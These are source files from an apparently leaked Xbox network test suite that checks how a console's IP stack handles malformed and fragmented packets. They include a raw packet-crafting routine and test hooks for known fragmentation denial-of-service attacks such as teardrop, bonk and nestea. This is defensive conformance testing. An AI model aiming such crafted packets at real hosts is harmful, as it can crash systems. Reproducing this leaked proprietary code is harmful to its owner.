		if(IPSockets[SocketIndex] == INVALID_SOCKET)
		{
			xLog(g_hLog, XLL_WARN, "Couldn't create socket!");
			fPassed = FALSE;
			goto Exit;
		}
		
		// Setup the local binding info
		LocalAddress.sin_addr.s_addr = INADDR_ANY;
		LocalAddress.sin_family = AF_INET;
		LocalAddress.sin_port = htons((LowPort + SocketIndex + ABOVE_MAX_SIMUL_PORT_OFFSET) % 0xffff + 1);

		// Bind the socket
		if(bind(IPSockets[SocketIndex], (const struct sockaddr *) &LocalAddress, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
			xLog(g_hLog, XLL_WARN, "Couldn't bind socket!");
			fPassed = FALSE;
			goto Exit;
		}

		// Add each socket to the fds structure
		FD_SET(IPSockets[SocketIndex], &SocketCollection);

		xLog(g_hLog, XLL_INFO, "Added socket %u to set for readability monitoring", SocketIndex);	
	}

	Sleep(5000);

	SocketsReady = 0;
	if((SocketsReady = select(0, &SocketCollection, NULL, NULL, &TimeOut)) != SIM_REASM_MAX)
	{
			xLog(g_hLog, XLL_WARN, "%u sockets were readable, expecting %u", SocketsReady, SIM_REASM_MAX);
			fPassed = FALSE;
			goto Exit;
	}

	// Check the available data and recv it from each of the sockets
	for(SocketIndex = 0; SocketIndex < SIM_REASM_MAX + 1; ++SocketIndex)
	{

		if(!FD_ISSET(IPSockets[SocketIndex], &SocketCollection))
		{
			xLog(g_hLog, XLL_INFO, "No data received on socket %u", SocketIndex);	
			continue;
		}

		xLog(g_hLog, XLL_INFO, "Querying socket %u for number of bytes available", SocketIndex);	

		// A datagram is buffered, now receive it...
		if(ioctlsocket(IPSockets[SocketIndex], FIONREAD, &dwBytesAvailable) == SOCKET_ERROR)
		{
			xLog(g_hLog, XLL_WARN, "Query for number of bytes available failed on socket %u", SocketIndex);
			fPassed = FALSE;
			goto Exit;
		}
		
		xLog(g_hLog, XLL_INFO, "Socket %u reported %u bytes available", SocketIndex, dwBytesAvailable);

		dwBufferSize = dwBytesAvailable ? dwBytesAvailable : 1;
		pBuffer = (CHAR *) LocalAlloc(LPTR, dwBufferSize);
		
		xLog(g_hLog, XLL_INFO, "Calling recvfrom on socket %u", SocketIndex);

		// Receive the datagram
		if((dwBytesReceived = recvfrom(IPSockets[SocketIndex], pBuffer, dwBufferSize, 0, (struct sockaddr *) &RemoteAddress, &nRemoteAddressSize)) == SOCKET_ERROR)
		{
			xLog(g_hLog, XLL_WARN, "Couldn't receive the datagram on socket %u", SocketIndex);
			fPassed = FALSE;
			goto Exit;
		}
		
		// Is the reported port correct?
		if(ntohs(RemoteAddress.sin_port) != LowPort)
		{
			xLog(g_hLog, XLL_WARN, "Reported destination port (%u) didn't match expected value (%u) on socket %u", ntohs(RemoteAddress.sin_port), LowPort, SocketIndex);
			fPassed = FALSE;
			goto Exit;
		}
		
		// Is the reported length correct?
		if(dwBytesReceived != 24)
		{
			xLog(g_hLog, XLL_WARN, "Reported length (%u) didn't match expected value (%u) on socket %u", dwBytesReceived, 24, SocketIndex);
			fPassed = FALSE;
			goto Exit;
		}
		
		xLog(g_hLog, XLL_INFO, "Packet on socket %u received successfully", SocketIndex);	

		// Free the buffer if necessary
		if(pBuffer)
		{
			LocalFree(pBuffer);
			pBuffer = NULL;
		}
	}

Exit:

	// We have to sleep long enough to guarantee that all fragments have timed out
	Sleep(60000);

		// Check the available data and recv it from each of the sockets
	for(SocketIndex = 0; SocketIndex < SIM_REASM_MAX + 1; ++SocketIndex)
		(IPSockets[SocketIndex] != INVALID_SOCKET) ? closesocket(IPSockets[SocketIndex]) : 0;

	pBuffer ? LocalFree(pBuffer) : 0;

	return fPassed;
}


//==================================================================================
// IPFragOversizedFragmentsTest
//----------------------------------------------------------------------------------
//
// Description: Test where server sends oversized fragment to try and empty the Xbox buffer
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOversizedFragmentsTest(WORD LowPort, WORD HighPort)
{
	xLog(g_hLog, XLL_INFO, "Always report success.  Look at debugger output to see if we ran out of system memory.");
	Sleep(5000);
	return TRUE;
}

//==================================================================================
// IPAttackTeardropTest
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original teardrop attack
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackTeardropTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 256, FALSE);
}

//==================================================================================
// IPAttackNewTeardropTest
//----------------------------------------------------------------------------------
//
// Description: Test where server sends the original newtear attack
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackNewTeardropTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 256, FALSE);
}

//==================================================================================
// IPAttackImpTeardropTest
//----------------------------------------------------------------------------------
//
// Description: Test where server sends an improved version of teardrop attack
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackImpTeardropTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 256, FALSE);
}

//==================================================================================
// IPAttackSynDropTest
//----------------------------------------------------------------------------------
//
// Description: Test where server sends an improved version of teardrop attack
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackSynDropTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 256, FALSE);
}

//==================================================================================
// IPAttackBonkTest
//----------------------------------------------------------------------------------
//
// Description: Test where server sends an the original bonk attack
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackBonkTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 256, FALSE);
}


//==================================================================================
// IPAttackZeroLenOptTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a datagram where the header contains a
// zero length option
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackZeroLenOptTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPAttackNesteaTest
//----------------------------------------------------------------------------------
//
// Description: Test where server sends an the nestea attack
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPAttackNesteaTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 256, FALSE);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\ip\server\ipserv.h ===
#ifndef __IPSERV_H__
#define __IPSERV_H__

//==================================================================================
// Includes
//==================================================================================

#include <netsync.h>
#include "ipmsg.h"
#include "spartaapi.h"

//==================================================================================
// Defines
//==================================================================================

#define IPVERSION_SIX 6
#define IPVERSION_BAD 15
#define IPVERSION_DEFAULT 4

#define IPHEADER_DEFAULT 20
#define IPHEADER_BELOWMIN 4
#define IPHEADER_MAX 60

#define IPTOS_NORMAL 0
#define IPTOS_NETCONTROL 224
#define IPTOS_LOWDELAY 16
#define IPTOS_HIGHTHRUPUT 8
#define IPTOS_HIGHRELI 4
#define IPTOS_RESERVED 1
#define IPTOS_DEFAULT IPTOS_NORMAL

#define IPLENGTH_DEFAULT UDPHEADER_SIZE + 1
#define IPLENGTH_BELOWMIN 10
#define IPLENGTH_ATMIN 20
#define IPLENGTH_MAX 1500

#define IPID_MIN 0
#define IPID_MAX MAXWORD
#define IPID_DEFAULT 100

#define IPFLAG_RESERVED 4
#define IPFLAG_DONTFRAG 2
#define IPFLAG_MOREFRAGS 1

#define IPTTL_MIN 0
#define IPTTL_MAX 255
#define IPTTL_DEFAULT 64

#define IPPROTOCOL_UNSUPPORTED 255
#define IPPROTOCOL_ICMP 1
#define IPPROTOCOL_IGMP 2
#define IPPROTOCOL_TCP 6
#define IPPROTOCOL_UDP 17

#define OVERSIZED_FRAG_COUNT 99
#define DEFAULT_FRAG_COUNT 4

// Net attack values

#define TEARDROP_SIZE 28
#define TEARDROP_XVALUE 3
#define NEWTEAR_SIZE 20
#define NEWTEAR_XVALUE 3
#define SYNDROP_SIZE 20
#define SYNDROP_XVALUE 3
#define BONK_SIZE 20
#define BONK_XVALUE 3

#define SIM_REASM_MAX 4

#define MAX_SIMUL_PORT_OFFSET 5
#define ABOVE_MAX_SIMUL_PORT_OFFSET 5

//==================================================================================
// Typedefs
//==================================================================================

// Session info structure
typedef struct _SESSION_INFO
{
	CInterfaceList *pInterfaceList;
	CInterface *pInterface;
	HANDLE hNetsyncObject;
	BYTE byClientCount;
	DWORD *ClientAddrs;
	WORD LowPort;
	WORD HighPort;
	CHAR szServerIPAddr[16];
	PIP_TESTREQ pCurrentRequest;
} SESSION_INFO, *PSESSION_INFO;

// IP test function type
typedef BOOL (*PIP_SERV_FUNCTION) (DWORD FromAddr, PSESSION_INFO pSessionInfo);

//==================================================================================
// Prototypes 
//==================================================================================

// Test case functions
BOOL IPVersionSixServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPVersionBadServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPHeaderLenBelowMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPHeaderLenMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPHeaderLenAboveTotalLenServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPHeaderLenAboveAvailServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPTosNormalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPTosNetControlServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPTosLowDelayServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPTosHighThroughputServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPTosHighReliabilityServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPTosReservedServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPLengthBelowMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPLengthAtMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPLengthAboveMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPLengthAboveTotalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPLengthBelowTotalServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPLengthMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPIDMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPIDMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFlagReservedSetServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFlagDontFragAndMoreFragsServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPTtlMinServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPTtlMaxServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPProtocolUnsupportedServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPProtocolICMPTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPProtocolIGMPTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPProtocolTCPTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPProtocolUDPTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPProtocolUnsupportedTooSmallServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPChecksumBadServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPOptionsAboveAvailServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPOptionsExactSizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPOptionsEndOfOpsLastServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPOptionsEndOfOpsFirstServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragFullReverseServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragMidReverseServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragLastInSecondServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragMixedSizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragOneHundredServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragMultipleLastFragmentServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragOverlappingFragmentsServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragMaxDatagramSizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragMaxReassemblySizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragAboveMaxReassemblySizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragMaxSimulReassemblyServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragAboveMaxSimulReassemblyServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPFragOversizedFragmentsServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPAttackTeardropServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPAttackNewTeardropServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPAttackImpTeardropServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPAttackSynDropServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPAttackBonkServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPAttackZeroLenOptServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
BOOL IPAttackNesteaServ (DWORD FromAddr, PSESSION_INFO pSessionInfo);
#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\ip\server\ipserv.cpp ===
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include "ipserv.h"
#include "myaddr.h"


PIP_SERV_FUNCTION	g_ServerFunctions[IPMSG_MAXTEST] = 
{
	IPVersionSixServ,												// IPMSG_VERSION_SIX,
	IPVersionBadServ,												// IPMSG_VERSION_BAD,
	IPHeaderLenBelowMinServ,										// IPMSG_HEADLEN_BELOWMIN,
	IPHeaderLenMaxServ,												// IPMSG_HEADLEN_MAX,
	IPHeaderLenAboveTotalLenServ,									// IPMSG_HEADLEN_ABOVETOTALLEN,
	IPHeaderLenAboveAvailServ,										// IPMSG_HEADLEN_ABOVEAVAIL,
	IPTosNormalServ,												// IPMSG_TOS_NORMAL,
	IPTosNetControlServ,											// IPMSG_TOS_NETCONTROL,
	IPTosLowDelayServ,												// IPMSG_TOS_LOWDELAY,
	IPTosHighThroughputServ,										// IPMSG_TOS_HIGHTHROUGH,
	IPTosHighReliabilityServ,										// IPMSG_TOS_HIGHRELI,
	IPTosReservedServ,												// IPMSG_TOS_RESERVED,
	IPLengthBelowMinServ,											// IPMSG_LENGTH_BELOWMIN,
	IPLengthAtMinServ,												// IPMSG_LENGTH_ATMIN,
	IPLengthAboveMinServ,											// IPMSG_LENGTH_ABOVEMIN,
	IPLengthAboveTotalServ,											// IPMSG_LENGTH_ABOVETOTAL,
	IPLengthBelowTotalServ,											// IPMSG_LENGTH_BELOWTOTAL,
	IPLengthMaxServ,												// IPMSG_LENGTH_MAXIMUM,
	IPIDMinServ,													// IPMSG_ID_MIN,
	IPIDMaxServ,													// IPMSG_ID_MAX,
	IPFlagReservedSetServ,											// IPMSG_FLAG_RESERVEDSET,
	IPFlagDontFragAndMoreFragsServ,									// IPMSG_FLAG_DFANDMF,
	IPTtlMinServ,													// IPMSG_TTL_MIN,
	IPTtlMaxServ,													// IPMSG_TTL_MAX,
	IPProtocolUnsupportedServ,										// IPMSG_PRO_UNSUP,
	IPProtocolICMPTooSmallServ,										// IPMSG_PRO_ICMP_TOOSMALL,
	IPProtocolIGMPTooSmallServ,										// IPMSG_PRO_IGMP_TOOSMALL,
	IPProtocolTCPTooSmallServ,										// IPMSG_PRO_TCP_TOOSMALL,
	IPProtocolUDPTooSmallServ,										// IPMSG_PRO_UDP_TOOSMALL,
	IPProtocolUnsupportedTooSmallServ,								// IPMSG_PRO_UNSUP_TOOSMALL,
	IPChecksumBadServ,												// IPMSG_CHECKSUM_BAD,
	IPOptionsAboveAvailServ,										// IPMSG_OPT_ABOVEAVAIL,
	IPOptionsExactSizeServ,											// IPMSG_OPT_EXACTSIZE,
	IPOptionsEndOfOpsLastServ,										// IPMSG_OPT_ENDOFOPSLAST,
	IPOptionsEndOfOpsFirstServ,										// IPMSG_OPT_ENDOFOPSFIRST,
	IPFragMaxSimulReassemblyServ,									// IPMSG_FRAG_MAXSIMREASM,
	IPFragAboveMaxSimulReassemblyServ,								// IPMSG_FRAG_ABOVEMAXSIMREASM,
	IPFragFullReverseServ,											// IPMSG_FRAG_FULLREVERSE,
	IPFragMidReverseServ,											// IPMSG_FRAG_MIDREVERSE,
	IPFragLastInSecondServ,											// IPMSG_FRAG_LASTINSECOND,
	IPFragMixedSizeServ,											// IPMSG_FRAG_MIXEDSIZE,
	IPFragOneHundredServ,											// IPMSG_FRAG_HUNDRED,
	IPFragMultipleLastFragmentServ,									// IPMSG_FRAG_MULTILASTFRAG,
	IPFragOverlappingFragmentsServ,									// IPMSG_FRAG_OVERLAPPING,
	IPFragMaxDatagramSizeServ,										// IPMSG_FRAG_MAXDGRAMSIZE,
	IPFragMaxReassemblySizeServ,									// IPMSG_FRAG_MAXREASMSIZE,
	IPFragAboveMaxReassemblySizeServ,								// IPMSG_FRAG_ABOVEMAXREASMSIZE,
	IPFragOversizedFragmentsServ,									// IPMSG_FRAG_OVERSIZED,
	IPAttackTeardropServ,											// IPMSG_ATTACK_TEARDROP,
	IPAttackNewTeardropServ,										// IPMSG_ATTACK_NEWTEAR,
	IPAttackImpTeardropServ,										// IPMSG_ATTACK_IMPTEAR,
	IPAttackSynDropServ,											// IPMSG_ATTACK_SYNDROP,
	IPAttackZeroLenOptServ,											// IPMSG_ATTACK_ZEROLENOPT,
	IPAttackBonkServ,												// IPMSG_ATTACK_BONK,
	IPAttackNesteaServ												// IPMSG_ATTACK_NESTEA,
};

extern "C" void PrintDebug(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}

extern "C" void LogDebugMessage(TCHAR *strMessage)
{
   _tprintf(strMessage);		// change to redirect your output
}

//==================================================================================
// DllMain
//----------------------------------------------------------------------------------
//
// Description: Global entry point
//
// Arguments:
//	HINSTANCE	hInstance	Handle to calling instance
//	DWORD		dwReason	Reason for calling entry point
//	LPVOID		lpContext	
//
// Returns:
//	TRUE on successful attach or detach, FALSE otherwise
//==================================================================================
BOOL WINAPI DllMain(IN HINSTANCE hInstance, IN DWORD dwReason, IN LPVOID lpContext)
{
    switch (dwReason) {

    case DLL_PROCESS_ATTACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}


//==================================================================================
// IpServerCallbackFunction
//----------------------------------------------------------------------------------
//
// Description: Function exported for Netsync callbacks
//
// Arguments:
//  HANDLE      hSessionObject  Handle to session instance
//	HANDLE		hNetsyncObject	Handle to calling instance
//	DWORD		FromAddr		Address of sender of message that caused the callback
//	CHAR		*ReceiveMessage	Buffer containing the packet that caused the callback
//	LPVOID		lpContext		Context indicating which session this belongs to
//
// Returns:
//	Returns TRUE if the message was received was successfully handled, FALSE otherwise
//==================================================================================
BOOL IpServerCallbackFunction(HANDLE hSessionObject, HANDLE hNetsyncObject, DWORD FromAddr, DWORD dwMessageType, DWORD dwMessageSize, CHAR *ReceiveMessage, LPVOID lpContext)
{
	PSESSION_INFO pSessionInfo = (PSESSION_INFO) lpContext;
	PIP_TESTREQ pTestRequest = (PIP_TESTREQ) ReceiveMessage;
	BOOL fSuccess = TRUE;

	switch(pTestRequest->dwMessageId)
	{
	case IPMSG_TESTREQ:
		// Client is requesting a test.
		// If we support that test, ACK it and run the server side of the case
		if(pTestRequest->TestId < IPMSG_MAXTEST)
		{
			pSessionInfo->pCurrentRequest = pTestRequest;

			Sleep(2000);

			// Run the test
			if(!g_ServerFunctions[pTestRequest->TestId](FromAddr, pSessionInfo))
			{
				_tprintf(TEXT("Error running server-side of test %u\n"), pTestRequest->TestId);
				break;
			}

			pSessionInfo->pCurrentRequest = NULL;
		}

		break;
	case IPMSG_TESTDONE:
		// Client is signalling that this test is done
		// May want to add and ack later if this isn't reliable enough
		fSuccess = FALSE;
		break;
	default:
		// Unknown message received
		break;
	}

	return fSuccess;
}


//==================================================================================
// IpServerStartFunction
//----------------------------------------------------------------------------------
//
// Description: Funtion called once for each session that is created
//
// Arguments:
//  HANDLE      hSessionObject  Handle to session instance
//	HANDLE		hNetsyncObject	Handle to calling instance
//	BYTE		byClientCount	Number of clients this test is being started with
//	DWORD		*ClientAddrs	List of client addresses (number of addresses indicated by byClientCount)
//	WORD		LowPort			The lowest port to use for this test
//	WORD		HighPort		The higest port to use for this test
//
// Returns:
//	Returns a pointer to the session information that is being stored for this session
//==================================================================================
LPVOID IpServerStartFunction(HANDLE hSessionObject, HANDLE hNetsyncObject, BYTE byClientCount, DWORD *ClientAddrs, WORD LowPort, WORD HighPort)
{
	PSESSION_INFO pCurrentSession = NULL;
	IN_ADDR ServerAddr;
	CHAR szServerAddr[16];

	pCurrentSession = (PSESSION_INFO) LocalAlloc(LPTR, sizeof(SESSION_INFO));
	_tprintf(TEXT("Starting session: 0x%08x\n"), pCurrentSession);

	// Fill the session info structure
	pCurrentSession->hNetsyncObject = hNetsyncObject;
	pCurrentSession->byClientCount = byClientCount;
	pCurrentSession->ClientAddrs = ClientAddrs;
	pCurrentSession->LowPort = LowPort;
	pCurrentSession->HighPort = HighPort;

	// Calculate the server address string
	ServerAddr.S_un.S_addr = GetMyAddr();
	strcpy(pCurrentSession->szServerIPAddr, inet_ntoa(ServerAddr));

	// Initialize the SPARTA variables for this session
	try
    {
		pCurrentSession->pInterfaceList = new CInterfaceList;
		pCurrentSession->pInterface = new CInterface(pCurrentSession->pInterfaceList->GetNameAt(0));
	}
    catch(CSpartaException *Ex)
    {
        _tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
        delete Ex;
    }

	// If anything needs to be setup for all the tests or if the currently
	// connected clients need to be tracked, it will be done here
	return (LPVOID) pCurrentSession;
}

//==================================================================================
// IpServerStopFunction
//----------------------------------------------------------------------------------
//
// Description: Function called once when each session is closed
//
// Arguments:
//  HANDLE      hSessionObject  Handle to session instance
//	HANDLE		hNetsyncObject	Handle to calling instance
//	LPVOID		lpContext		Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
VOID IpServerStopFunction(HANDLE hSessionObject, HANDLE hNetsyncObject, LPVOID lpContext)
{
	PSESSION_INFO pCurrentSession = (PSESSION_INFO) lpContext;

	_tprintf(TEXT("Stopping session: 0x%08x\n"), pCurrentSession);

	// Uninitialize the SPARTA variables for this session
	pCurrentSession->pInterfaceList ? delete pCurrentSession->pInterfaceList : 0;
	pCurrentSession->pInterface ? delete pCurrentSession->pInterface : 0;
	pCurrentSession->pCurrentRequest = NULL;

	LocalFree(pCurrentSession);

	// If anything needs to be cleaned up, it will be done here.
	return;
}


//==================================================================================
// Test functions
//==================================================================================

//==================================================================================
// SendIPPacket
//----------------------------------------------------------------------------------
//
// Description: Test that sends an IP packet with the specified parameters
//
// Arguments:
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//	DWORD			FromAddr		Address of user that requested the test
//	BYTE			Version			Version number of the outgoing datagram
//	BYTE			HeaderLength	Header length of the outgoing datagram
//	BYTE			TypeOfService	Type-of-service of the outgoing datagram
//	WORD			TotalLength		Total length of the outgoing datagram
//	WORD			Id				IP identification number of the outgoing datagram
//	BYTE			Flags			Flags field of the outgoing datagram
//	WORD			FragOffset		Fragment offsett of the outgoing datagram
//	BYTE			TimeToLive		Time-to-live of the outgoing datagram
//	BYTE			Protocol		Protocol field of the outgoing datagram
//	DWORD			PayloadSize		Number of bytes allocated for the packet
//	BOOL			fCalcChecksum	Indicates whether to generate a checksum or use a default bad value
//	BOOL			fCalcHdrLen		Indicates whether to generate the header len or use the HeaderLength value
//  BOOL			fPadHdr			Indicates whether to pad the header with options to the size of HeaderLength
//	BOOL			fCalcTotalLen	Indicates whether to generate the total len or use the TotalLength value
//	
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL SendIPPacket(PSESSION_INFO pSessionInfo, DWORD FromAddr, BYTE Version, BYTE HeaderLength, BYTE TypeOfService, WORD TotalLength, WORD Id, BYTE Flags, WORD FragOffset, BYTE TimeToLive, BYTE Protocol, DWORD PayloadSize, BOOL fCalcChecksum, BOOL fCalcHdrLen, BOOL fPadHdr, BOOL fCalcTotalLen)
{
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16], *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	// Format the client Mac address string
	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Format the client IP address string
	ClientAddr.S_un.S_addr = FromAddr;
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szClientMacAddr);
		
		// Create the packet
		((Protocol == PROTOCOL_UDP) && (PayloadSize >= UDPHEADER_SIZE)) ? pIPPacket = new CUDPPacket(MediaType) : pIPPacket = new CIPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
		pIPPacket->MacHeader.SetProtocolType(0x800);
		pIPPacket->IPHeader.SetVersion(Version);
		pIPPacket->IPHeader.SetTOS(TypeOfService);
		pIPPacket->IPHeader.SetID(Id);
		pIPPacket->IPHeader.SetFlag(Flags);
		pIPPacket->IPHeader.SetFragOffset(FragOffset);
		pIPPacket->IPHeader.SetTTL(TimeToLive);
		pIPPacket->IPHeader.SetProtocolType(Protocol);
		pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
		pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
		
		// Set up the total length field
		if(fCalcTotalLen)
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(ON);
		else
		{
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(TotalLength);
		}
		
		// Set up the header length field
		if(fCalcHdrLen)
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
		else
		{
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
			pIPPacket->IPHeader.SetHdrLength(HeaderLength);

			// If the header is bigger than the default, fill it with no-ops
			if((HeaderLength > IPHEADER_SIZE) && fPadHdr)
			{
				// For each additional double-word in the header beyond the default, add 4 no-opts (1 byte each)
				for(INT DoubleWordIndex = 0; DoubleWordIndex < HeaderLength - IPHEADER_SIZE ;  DoubleWordIndex++)
				{
					pIPPacket->IPHeader.CreateIPOption(IP_OPTIONS_NO_OPERATION);
				}
			}
		}
		
		// Set up the IP header checksum
		if(fCalcChecksum)
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
		else
		{
			pIPPacket->IPHeader.SetAutoCalcChecksum(OFF);
			pIPPacket->IPHeader.SetChecksum(0xFFFF);	// Not guaranteed to fail, but close enough
		}
		
		// Set up the UDP fields if necessary
		if((Protocol == PROTOCOL_UDP)  && (PayloadSize >= UDPHEADER_SIZE))
		{
			WORD HeaderSize = fCalcHdrLen ? IPHEADER_SIZE : HeaderLength * 4;

			CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
			
			pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
